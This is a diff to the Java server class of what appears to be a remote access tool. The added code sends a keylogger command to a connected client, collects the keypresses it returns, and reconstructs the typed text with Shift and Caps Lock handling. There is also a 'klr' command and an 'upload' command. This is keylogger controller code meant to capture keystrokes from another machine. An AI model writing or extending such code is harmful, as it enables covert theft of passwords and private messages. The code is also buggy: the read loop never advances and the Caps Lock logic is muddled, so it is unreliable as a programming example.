@@ -91,10 +91,56 @@ public class Server implements Runnable {
                     int choice = Keyboard.readInt();
                     if (choice==0) {
                         ps.println("klg");
+                        String confirm = din.readLine();
+                        if (!confirm.equals("ok")) {
+                            System.out.println("nonfatal communication sync error: more errors are likely to occur");
+                            continue;
+                        }
+                        ArrayList<String> keypresses = new ArrayList<String>();
+                        String line = din.readLine();
+                        while(!line.equals("{}{}{}")) {
+                            keypresses.add(line);
+                        }
+                        System.out.println("keypress retrieval completed successfully");
+                        boolean shift = false;
+                        boolean capslock = false;
+                        String output = "";
+                        for (String s : keypresses) {
+                            if (s.indexOf("Unknown")==-1) {
+                                if (s.indexOf("Shift")!=-1) {
+                                    if (s.substring(0,1).equals("p")) {
+                                        shift=true;
+                                    } else {
+                                        shift=false;
+                                    }
+                                }
+                                if (s.indexOf("Caps")!=-1) {
+                                    if (s.substring(0,1).equals("p")) {
+                                        if (shift==true) {
+                                            shift=false;
+                                        } else {
+                                            shift=true;
+                                        }
+                                    }
+                                }
+                                String seg = s;
+                                if (shift) {
+                                    seg = seg.toUpperCase();
+                                } else {
+                                    seg = seg.toLowerCase();
+                                }
+                                output = output+seg;
+                            }
+                        }
+                        System.out.println(output);
+                        
                         
                     } else if (choice==1) {
                         ps.println("klr");
-                        
+                        String confirm = din.readLine();
+                        if (!confirm.equals("c")) {
+                            System.out.println("nonfatal communication sync error: more errors are likely to occur");
+                        }
                     }
                 }
                 if (command.equals("upload")) {
